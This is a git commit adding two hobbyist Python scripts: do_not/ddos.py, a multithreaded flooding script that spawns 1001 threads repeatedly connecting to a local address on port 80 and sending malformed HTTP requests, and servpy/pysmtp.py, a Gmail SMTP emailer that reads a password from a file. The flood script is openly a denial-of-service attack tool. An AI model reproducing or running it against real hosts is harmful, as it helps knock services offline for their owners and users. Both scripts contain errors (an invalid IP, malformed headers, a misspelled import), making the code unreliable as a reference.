90d94673b839f4e29e5c0b85720f65a529649c68
Joel_Paiva <joelpaiva112233@gmail.com>
2023-01-06 23:03:02 +0200

    added a ddos script to do_not, so do not....also added a smtp server program for sending emails with python

---
+++ do_not/ddos.py
@@ -0,0 +1,25 @@
+#!/bin/python3
+
+import threading
+import socket
+
+deadboi = '192.168.8.1'
+port = 80
+notmyip = '192.805.9.5'
+
+connections = 0
+
+def death():
+    while True:
+        sockboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sockboi.connect((deadboi, port))
+        sockboi.sendto(("GET /" + deadboi + "HTTP/1.1\r\n").encode("ascii"), (deadboi, port))
+        sockboi.sendto(("Hosts: " + notmyip + "\r\n\r\n").encode("ascii"), (deadboi, port))
+        sockboi.close()
+        global connections
+        connections += 1
+        print(connections)
+
+for i in range(1001):
+    threadboi = threading.Thread(target=death)
+    threadboi.start()
---
+++ servpy/pysmtp.py
@@ -0,0 +1,42 @@
+#!/bin/python3
+
+import smtplib
+from email import encoders
+from enail.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email.mime.multipart import MIMEMultipart
+
+
+server = smtplib.SMTP('smtp.gmail.com', 25)
+
+server.ehlo()
+
+
+with open('password.txt', 'r') as f:
+    password = f.read()
+
+server.login('joelpaiva112233@gmail.com', password)
+
+msg = MIMEMultipart()
+msg['from '] = 'DERTYBOI'
+msg['to'] = 'joelpaiva112233@gmail.com'
+msg['subject'] = 'test'
+
+with open('testmessage.txt', 'r') as f:
+    message = f.read()
+
+msg.attach(MIMEText(message, 'plain'))
+
+filename = 'derty.PNG'
+attachment = open(filename, 'rb') 
+
+pay = MIMEBase('application', 'octet-stream')
+pay.set_payload(attachment.read())
+
+encoders.encode_base64(pay)
+pay.add_header('Content-Disposition', f'attachment; filename {filename}')
+msg.attach(pay)
+
+text = msg.as_string()
+
+server.sendmail('joelpaiva112233@gmail.com','joelpaiva112233@gmail.com', text)
